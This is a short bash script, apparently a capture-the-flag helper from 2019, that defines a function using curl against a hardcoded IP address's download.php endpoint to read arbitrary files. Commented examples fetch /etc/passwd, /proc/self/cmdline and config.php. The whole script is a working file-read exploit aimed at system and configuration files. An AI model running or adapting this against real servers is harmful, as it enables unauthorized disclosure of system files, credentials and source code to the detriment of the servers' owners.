#!/usr/bin/env bash

# Author : Virink <virink@outlook.com>
# Date   : 2019/08/18, 15:29

function get(){
    curl -s -q -k "http://47.111.59.243:9016/download.php?filename=$1" --output -
}

# get "/etc/passwd"
# get "/proc/self/cmdline"
# get "config.php"